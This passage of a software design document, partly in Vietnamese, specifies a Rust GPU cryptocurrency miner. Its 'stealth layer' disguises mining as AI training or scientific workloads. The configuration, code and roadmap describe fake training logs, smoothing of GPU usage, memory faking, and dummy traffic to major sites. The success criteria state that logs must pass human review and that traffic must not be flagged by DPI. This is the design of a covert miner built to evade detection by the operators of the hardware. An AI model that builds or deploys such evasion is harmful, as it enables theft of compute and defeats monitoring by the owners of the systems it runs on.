
### 7.2 Error Handling Strategy

**Layered Error Handling**:

```rust
use thiserror::Error;

#[derive(Error, Debug)]
pub enum MiningError {
    #[error("Security initialization failed: {0}")]
    SecurityInit(#[from] security::SecurityError),

    #[error("Stealth layer failed: {0}")]
    StealthLayer(#[from] stealth_layer::StealthError),

    #[error("GPU error: {0}")]
    Gpu(#[from] mining_core::GpuError),

    #[error("Network error: {0}")]
    Network(#[from] reqwest::Error),

    #[error("Wallet encryption failed: {0}")]
    WalletEncryption(String),
}

// Graceful error recovery
impl MiningError {
    pub fn is_recoverable(&self) -> bool {
        matches!(
            self,
            MiningError::Network(_) | MiningError::Gpu(_)
        )
    }

    pub fn retry_delay(&self) -> Option<Duration> {
        match self {
            MiningError::Network(_) => Some(Duration::from_secs(30)),
            MiningError::Gpu(_) => Some(Duration::from_secs(10)),
            _ => None,
        }
    }
}
```

---

## 8. Configuration Schema

**Complete TOML Configuration**:

```toml
# config/production.toml

[mining]
algorithm = "ethash"  # ethash | kawpow
pool_url = "stratum+tcp://eth.f2pool.com:6688"
wallet = "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb"
worker_name = "rig1"

[mining.gpu]
devices = [0]  # GPU indices
threads_per_gpu = 8192

[stealth]
enabled = true

[stealth.profiles]
enabled = ["ai_training"]  # ai_training | ai_inference | image_processing | scientific_computing

[stealth.profiles.ai_training]
model_name = "ResNet50"
total_epochs = 100
batch_size = 64
log_every_n_batches = 10

[stealth.profiles.ai_inference]
model_name = "BERT-base"
avg_rps = 5.0
batch_size = 16

[stealth.profiles.image_processing]
batch_size = 100
operations = ["resize", "filter"]

[stealth.profiles.scientific_computing]
simulation_type = "molecular_dynamics"
total_timesteps = 10000

[camouflage]
gpu_smoother_enabled = true
gpu_smoother_alpha = 0.2  # EMA smoothing factor
gpu_smoother_jitter = 0.05  # ±5% jitter
gpu_smoother_max_variance = 0.10  # Max ±10% from target

memory_faker_enabled = true
memory_faker_strategy = "periodic"  # periodic | bursty
memory_faker_interval_secs = 30
memory_faker_size_range_mb = [1, 5]

network_mixer_enabled = true
network_mixer_dummy_hosts = [
    "https://www.google.com",
    "https://api.github.com",
    "https://aws.amazon.com",
]
network_mixer_min_packet_size = 1024
network_mixer_jitter_range_ms = [50, 200]

[network]
enable_proxy = false
proxy_url = "http://localhost:8888"
proxy_timeout_secs = 5

[security]
enable_seccomp = true
seccomp_profile = "Strict"  # AllowAll | Whitelist | Strict

enable_namespaces = true
user_namespace = true
network_namespace = false  # Requires external veth setup
mount_namespace = true

[security.wallet]
password_env_var = "MINING_WALLET_PASSWORD"
encrypted_wallet_path = "/etc/mining/wallet.enc"

[logging]
level = "info"  # trace | debug | info | warn | error
format = "json"  # json | compact
output = "stdout"  # stdout | file
```

**Configuration Loading**:

```rust
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct Config {
    pub mining: MiningConfig,
    pub stealth: StealthConfig,
    pub camouflage: CamouflageConfig,
    pub network: NetworkConfig,
    pub security: SecurityConfig,
    pub logging: LoggingConfig,
}

impl Config {
    pub fn load_from_file(path: &str) -> Result<Self> {
        let content = std::fs::read_to_string(path)?;
        let config: Config = toml::from_str(&content)?;

        config.validate()?;

        Ok(config)
    }

    pub fn validate(&self) -> Result<()> {
        // Validate ranges
        if self.camouflage.gpu_smoother_alpha < 0.0 || self.camouflage.gpu_smoother_alpha > 1.0 {
            anyhow::bail!("gpu_smoother_alpha must be in [0.0, 1.0]");
        }

        // Validate profile compatibility
        if self.stealth.profiles.enabled.is_empty() && self.stealth.enabled {
            warn!("Stealth enabled but no profiles configured");
        }

        Ok(())
    }
}
```

---

## 9. Testing Strategy

### 9.1 Test Pyramid

```
        E2E Tests (10%)
       /               \
      /  Integration    \
     /   Tests (30%)     \
    /                     \
   /_______________________\
   Unit Tests (60%)
```

**Coverage Targets**:
- **Unit Tests**: 60% of total tests, 85% code coverage
- **Integration Tests**: 30% of total tests, 70% coverage
- **E2E Tests**: 10% of total tests, critical paths only

### 9.2 Unit Test Examples

**Stealth Layer**:
```rust
#[cfg(test)]
mod stealth_tests {
    use super::*;

    #[tokio::test]
    async fn test_profile_lifecycle() {
        let mut wrapper = AiTrainingWrapper::new(TrainingConfig::default());

        wrapper.start().await.unwrap();
        assert!(wrapper.task_handle.is_some());

        tokio::time::sleep(Duration::from_secs(2)).await;

        wrapper.stop().await.unwrap();
        assert!(wrapper.task_handle.is_none());
    }

    #[test]
    fn test_gpu_pattern_phases() {
        let wrapper = AiTrainingWrapper::new(TrainingConfig::default());
        let pattern = wrapper.gpu_usage_pattern();

        assert_eq!(pattern.phase, WorkloadPhase::RampUp);
        assert!(pattern.target_utilization > 0.0);
    }
}
```

**Security Layer**:
```rust
#[cfg(test)]
mod security_tests {
    use super::*;

    #[test]
    fn test_nonce_uniqueness() {
        let protector = WalletProtector::new("test").unwrap();
        let mut nonces = std::collections::HashSet::new();

        for _ in 0..1000 {
            let encrypted = protector.encrypt_wallet("0xABC").unwrap();
            assert!(nonces.insert(encrypted.nonce.clone()));
        }
    }

    #[test]
    #[should_panic]
    fn test_seccomp_blocks_execve() {
        apply_strict_profile().unwrap();
        std::process::Command::new("/bin/sh").spawn().unwrap();
    }
}
```

### 9.3 Integration Tests

**Full Stealth + Mining Integration**:

```rust
#[tokio::test]
async fn test_stealth_integrated_with_mining() {
    // Setup
    let config = Config::load_from_file("tests/fixtures/test_config.toml").unwrap();

    // Start stealth profiles
    let mut profile_manager = ProfileManager::new(config.stealth.profile_config);
    profile_manager.register(Box::new(AiTrainingWrapper::new(config.stealth.ai_training)));
    profile_manager.start_all().await.unwrap();

    // Start GPU manager với smoother
    let mut gpu_manager = GpuManager::new(config.mining.gpu_config).unwrap();
    gpu_manager.initialize_smoothers().unwrap();

    // Run mining loop for 30 seconds
    let start = std::time::Instant::now();
    while start.elapsed() < Duration::from_secs(30) {
        let smoothed_usage = gpu_manager.get_smoothed_usage(0).unwrap();

        // Verify smoothing is active
        assert!(smoothed_usage > 0.0);
        assert!(smoothed_usage <= 1.0);

        tokio::time::sleep(Duration::from_millis(100)).await;
    }

    // Cleanup
    profile_manager.stop_all().await.unwrap();
    gpu_manager.cleanup().unwrap();
}
```

**Wallet Encryption Integration**:

```rust
#[test]
fn test_wallet_save_load_cycle() {
    use tempfile::NamedTempFile;

    let temp_file = NamedTempFile::new().unwrap();
    let path = temp_file.path();

    let protector = WalletProtector::new("password").unwrap();
    let wallet = "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb";

    // Encrypt and save
    let encrypted = protector.encrypt_wallet(wallet).unwrap();
    save_encrypted_wallet(path, &encrypted).unwrap();

    // Load and decrypt
    let loaded = load_encrypted_wallet(path).unwrap();
    let decrypted = protector.decrypt_wallet(&loaded).unwrap();

    assert_eq!(decrypted, wallet);
}
```

### 9.4 E2E Tests

**Full System Test** (Docker-based):

```rust
#[tokio::test]
#[ignore] // Run only in CI với GPU
async fn test_full_system_end_to_end() {
    // Start mock Stratum pool
    let mock_pool = MockStratumPool::start().await;

    // Update config to point to mock pool
    let config = Config {
        mining: MiningConfig {
            pool_url: mock_pool.url(),
            ..Default::default()
        },
        ..Default::default()
    };

    // Start mining system
    let mining_task = tokio::spawn(async move {
        start_mining(config).await
    });

    // Wait for shares
    tokio::time::sleep(Duration::from_secs(60)).await;

    // Verify shares submitted
    let shares = mock_pool.get_received_shares().await;
    assert!(shares.len() > 0);

    // Shutdown
    send_shutdown_signal();
    mining_task.await.unwrap().unwrap();
}
```

### 9.5 Testing Tools

**Mock Stratum Pool**:

```rust
pub struct MockStratumPool {
    port: u16,
    received_shares: Arc<Mutex<Vec<Share>>>,
    shutdown_tx: Option<tokio::sync::oneshot::Sender<()>>,
}

impl MockStratumPool {
    pub async fn start() -> Self {
        let port = 13333;
        let received_shares = Arc::new(Mutex::new(Vec::new()));

        let shares_clone = received_shares.clone();

        let (shutdown_tx, shutdown_rx) = tokio::sync::oneshot::channel();

        tokio::spawn(async move {
            Self::run_server(port, shares_clone, shutdown_rx).await;
        });

        Self {
            port,
            received_shares,
            shutdown_tx: Some(shutdown_tx),
        }
    }

    pub fn url(&self) -> String {
        format!("stratum+tcp://localhost:{}", self.port)
    }

    pub async fn get_received_shares(&self) -> Vec<Share> {
        self.received_shares.lock().await.clone()
    }

    async fn run_server(
        port: u16,
        shares: Arc<Mutex<Vec<Share>>>,
        mut shutdown_rx: tokio::sync::oneshot::Receiver<()>,
    ) {
        // Mock Stratum server implementation
        // ... (simplified for brevity)
    }
}
```

---

## 10. Implementation Roadmap

### 10.1 Task Breakdown với Effort Estimates

**Wave 3: Stealth Layer Implementation** (4-5 weeks)

| Task ID | Task Description | Dependencies | Effort (hours) | Priority |
|---------|------------------|--------------|----------------|----------|
| S3.1.1 | Implement AI Training Wrapper | - | 8 | CRITICAL |
| S3.1.2 | Implement AI Inference Wrapper | - | 8 | HIGH |
| S3.1.3 | Implement Image Processing Wrapper | - | 6 | MEDIUM |
| S3.1.4 | Implement Scientific Computing Wrapper | - | 6 | MEDIUM |
| S3.1.5 | Implement ProfileManager | S3.1.1-4 | 4 | CRITICAL |
| S3.2.1 | Implement GPU Usage Smoother | - | 6 | CRITICAL |
| S3.2.2 | Implement Memory Pattern Faker | - | 4 | HIGH |
| S3.2.3 | Implement Network Traffic Mixer | - | 8 | CRITICAL |
| S3.3.1 | Implement Proxy Router | - | 10 | HIGH |
| S3.3.2 | Implement Local Proxy Server | - | 8 | MEDIUM |
| S3.4.1 | Unit tests cho wrappers | S3.1.1-5 | 8 | HIGH |
| S3.4.2 | Integration tests | S3.1-3 | 12 | CRITICAL |

**Total Wave 3**: ~88 developer-hours (≈11 days với 1 developer)

---

**Wave 4: Security Hardening** (3-4 weeks)

| Task ID | Task Description | Dependencies | Effort (hours) | Priority |
|---------|------------------|--------------|----------------|----------|
| S4.1.1 | Fix wallet encryption nonce bug | - | 2 | CRITICAL |
| S4.1.2 | Update encrypt/decrypt functions | S4.1.1 | 1 | CRITICAL |
| S4.1.3 | Comprehensive crypto tests | S4.1.2 | 4 | CRITICAL |
| S4.2.1 | Implement seccomp whitelist profile | - | 8 | CRITICAL |
| S4.2.2 | Implement seccomp strict profile | S4.2.1 | 4 | HIGH |
| S4.2.3 | Seccomp integration tests | S4.2.1-2 | 6 | HIGH |
| S4.3.1 | Implement user namespace isolation | - | 6 | CRITICAL |
| S4.3.2 | Implement network namespace | - | 8 | HIGH |
| S4.3.3 | Implement mount namespace | - | 6 | HIGH |
| S4.3.4 | Namespace integration tests | S4.3.1-3 | 8 | HIGH |
| S4.4.1 | Integration với mining-core | S4.1-3 | 12 | CRITICAL |
| S4.4.2 | E2E testing | S4.4.1 | 16 | CRITICAL |

**Total Wave 4**: ~81 developer-hours (≈10 days với 1 developer)

---

### 10.2 Dependency Graph

```
S3.1.1 (AI Training) ────┐
S3.1.2 (AI Inference) ───┤
S3.1.3 (Image Proc) ─────┼──> S3.1.5 (ProfileManager) ──┐
S3.1.4 (Scientific) ─────┘                              │
                                                         │
S3.2.1 (GPU Smoother) ───┐                              │
S3.2.2 (Memory Faker) ───┼──> S3.4.2 (Integration) ─────┤
S3.2.3 (Network Mixer) ──┘                              │
                                                         │
S3.3.1 (Proxy Router) ───┐                              │
S3.3.2 (Proxy Server) ───┴─────────────────────────────┘
                                                         │
                                                         ↓
                                                  Wave 3 Complete
                                                         │
                                                         ↓
S4.1.1 (Fix nonce) ──> S4.1.2 (Crypto) ──> S4.1.3 (Tests) ──┐
                                                             │
S4.2.1 (Whitelist) ──> S4.2.2 (Strict) ──> S4.2.3 (Tests) ──┤
                                                             │
S4.3.1 (User NS) ─────┐                                     │
S4.3.2 (Net NS) ──────┼──> S4.3.4 (NS Tests) ──────────────┤
S4.3.3 (Mount NS) ────┘                                     │
                                                             │
                                                             ↓
                                       S4.4.1 (Integration) ──> S4.4.2 (E2E) ──> Wave 4 Complete
```

### 10.3 Critical Path Analysis

**Critical Path** (longest dependency chain):

1. AI Training Wrapper (8h)
2. ProfileManager (4h)
3. Integration Tests (12h)
4. Fix Nonce Bug (3h)
5. Seccomp Whitelist (8h)
6. User Namespace (6h)
7. Mining Core Integration (12h)
8. E2E Testing (16h)

**Total Critical Path**: 69 hours ≈ **9 developer-days**

**Parallelization Opportunity**: Nhiều tasks có thể chạy song song (wrappers, camouflage components, security components). Với 2 developers, có thể giảm xuống **5-6 weeks**.

### 10.4 Milestones

**Milestone 1** (End of Week 2):
- ✅ All 4 stealth profiles implemented
- ✅ ProfileManager working
- ✅ Unit tests passing

**Milestone 2** (End of Week 3):
- ✅ GPU Smoother, Memory Faker, Network Mixer implemented
- ✅ Proxy Router working
- ✅ Integration tests passing

**Milestone 3** (End of Week 5):
- ✅ Wallet encryption fixed và tested
- ✅ Seccomp profiles implemented
- ✅ All security tests passing

**Milestone 4** (End of Week 7):
- ✅ Namespace isolation working
- ✅ Full integration với mining-core
- ✅ E2E tests passing
- ✅ **Phase 3 Complete**

---

## 11. Risk Assessment & Mitigation

### 11.1 Technical Risks

| Risk | Likelihood | Impact | Mitigation Strategy |
|------|------------|--------|---------------------|
| Seccomp breaks GPU drivers | Medium | High | Extensive testing với real GPUs, document syscall requirements |
| Namespace isolation conflicts với Docker | High | Medium | Test on target Docker version, document compatibility |
| Stealth logs still detectable | Medium | High | ML-based analysis of logs, continuous improvement |
| Performance degradation >5% | Low | Medium | Benchmark continuously, optimize hot paths |
| Nonce fix breaks existing wallets | Low | Critical | Migration tool, backup before upgrade |

### 11.2 Timeline Risks

| Risk | Likelihood | Impact | Mitigation Strategy |
|------|------------|--------|---------------------|
| Underestimated effort | Medium | High | Buffer 20% extra time, prioritize critical tasks |
| GPU hardware unavailable | Low | Critical | Cloud GPU instances (AWS p3/p4) |
| Integration bugs | High | Medium | Continuous integration testing, early prototyping |
| Seccomp testing requires root | Medium | Low | Docker-based testing, CI với privileged containers |

### 11.3 Security Risks

| Risk | Likelihood | Impact | Mitigation Strategy |
|------|------------|--------|---------------------|
| Crypto implementation bugs | Low | Critical | External security audit, property-based testing |
| Syscall whitelist too permissive | Medium | High | Conservative whitelist, periodic review |
| Namespace escape | Low | Critical | Follow CIS Benchmarks, kernel updates |
| Stealth bypass | Medium | High | Continuous monitoring, machine learning detection |

---

## 12. Success Criteria

**Phase 3 Complete When**:

### 12.1 Functional Requirements

- ✅ **Stealth Profiles** (Step 3.2.1):
  - [ ] 4 profiles generate realistic logs
  - [ ] Configurable enable/disable
  - [ ] GPU patterns match legitimate workloads

- ✅ **Resource Camouflage** (Step 3.2.2):
  - [ ] GPU usage variance <±10% from target
  - [ ] Memory faker creates observable allocations
  - [ ] Network mixer adds padding và jitter

- ✅ **Network Traffic Mixer** (Step 3.2.3):
  - [ ] Proxy routing working
  - [ ] Traffic padded to 4KB blocks
  - [ ] Jitter delays applied

- ✅ **Wallet Encryption** (Step 3.2.4):
  - [ ] Random nonce generation
  - [ ] 1000 successful decrypt cycles
  - [ ] No nonce reuse detected

- ✅ **Seccomp Profiles** (Step 3.2.5):
  - [ ] Strict profile blocks dangerous syscalls
  - [ ] Mining works under whitelist profile
  - [ ] Automated tests verify blocking

- ✅ **Namespace Isolation** (Step 3.2.6):
  - [ ] User namespace với UID mapping
  - [ ] Network namespace optional (veth setup)
  - [ ] Mount namespace với read-only root
  - [ ] Works in Docker GPU containers

### 12.2 Quality Requirements

- ✅ **Test Coverage**:
  - [ ] Unit tests ≥85% coverage
  - [ ] Integration tests cover critical paths
  - [ ] E2E test với real GPU passing

- ✅ **Performance**:
  - [ ] Hashrate degradation <5% với stealth enabled
  - [ ] Memory overhead <500MB
  - [ ] Startup time <10 seconds

- ✅ **Documentation**:
  - [ ] Architecture docs updated
  - [ ] Configuration examples
  - [ ] Troubleshooting guide
  - [ ] Kernel requirements documented

### 12.3 Security Requirements

- ✅ **Cryptography**:
  - [ ] No CRITICAL vulnerabilities in audit
  - [ ] NIST SP 800-38D compliant
  - [ ] Nonce uniqueness validated

- ✅ **Sandboxing**:
  - [ ] Seccomp applied successfully
  - [ ] Namespaces isolated
  - [ ] Privilege dropping working

- ✅ **Detection Resistance**:
  - [ ] Logs pass human review
  - [ ] GPU patterns pass statistical analysis
  - [ ] Network traffic not flagged by DPI

---

## Appendix A: Reference Materials

### A.1 External Documentation

- **AES-GCM**: [NIST SP 800-38D](https://csrc.nist.gov/publications/detail/sp/800-38d/final)
- **Argon2**: [RFC 9106](https://datatracker.ietf.org/doc/html/rfc9106)
- **Seccomp**: [Linux Kernel Documentation](https://www.kernel.org/doc/Documentation/prctl/seccomp_filter.txt)
- **Namespaces**: [man 7 namespaces](https://man7.org/linux/man-pages/man7/namespaces.7.html)
- **Docker GPU**: [NVIDIA Container Toolkit](https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/install-guide.html)

### A.2 Code References

**Key Files** (after implementation):

- `crates/stealth-layer/src/wrappers/ai_training_wrapper.rs`
- `crates/stealth-layer/src/resource_camouflage/gpu_usage_smoother.rs`
- `crates/security/src/crypto/wallet_protection.rs`
- `crates/security/src/sandboxing/seccomp_profiles.rs`
- `crates/security/src/sandboxing/namespace_isolation.rs`
- `crates/cli/src/commands/start.rs`

### A.3 Dependency Versions

```toml
[workspace.dependencies]
# Core
tokio = { version = "1.40", features = ["full"] }
serde = { version = "1.0", features = ["derive"] }
tracing = "0.1"
anyhow = "1.0"
thiserror = "1.0"

# Stealth
rand = "0.8"
libc = "0.2"

# Security
aes-gcm = "0.10"
argon2 = "0.5"
libseccomp = "0.3"
nix = { version = "0.29", features = ["user", "mount", "sched"] }

# Network
reqwest = { version = "0.11", features = ["json"] }
warp = "0.3"

# Testing
tempfile = "3.8"
hex = "0.4"
```

---

## Appendix B: Troubleshooting Guide

### B.1 Common Issues

**Issue**: Seccomp blocks GPU access

```
Error: ioctl syscall blocked
```

**Solution**: Add `ioctl` to whitelist:

```rust
let allowed_syscalls = vec![
    // ... existing syscalls
    "ioctl",  // CRITICAL for CUDA
];
```

---

**Issue**: Namespace isolation fails trong Docker

```
Error: Operation not permitted
```

**Solution**: Run với `--cap-add=SYS_ADMIN`:

```bash
docker run --gpus all --cap-add=SYS_ADMIN mining-image
```

---

**Issue**: Wallet decryption fails after restart

```
Error: Decryption failed
```

**Solution**: Verify nonce is stored WITH ciphertext:

```rust
pub struct EncryptedWallet {
    pub nonce: Vec<u8>,  // MUST be present
    pub ciphertext: Vec<u8>,
}
```

---

**Issue**: GPU smoother not reducing variance

```
GPU usage still spiky
```

**Solution**: Tune alpha parameter:

```toml
[camouflage]
gpu_smoother_alpha = 0.1  # Lower = more smoothing
```

---

## Document Changelog

**Version 1.0** (2025-10-02):
- Initial architecture specification
- All 6 Phase 3 steps designed
- Testing strategy defined
- Implementation roadmap created

---

**Document Status**: ✅ **DESIGN COMPLETE - READY FOR IMPLEMENTATION**

**Next Steps**:
1. Review với team (Tech Lead, Security Engineer, QA)
2. Create GitHub issues từ task breakdown
3. Setup CI/CD pipeline cho testing
4. Begin Wave 3 implementation (Stealth Layer)

---

**END OF DOCUMENT**
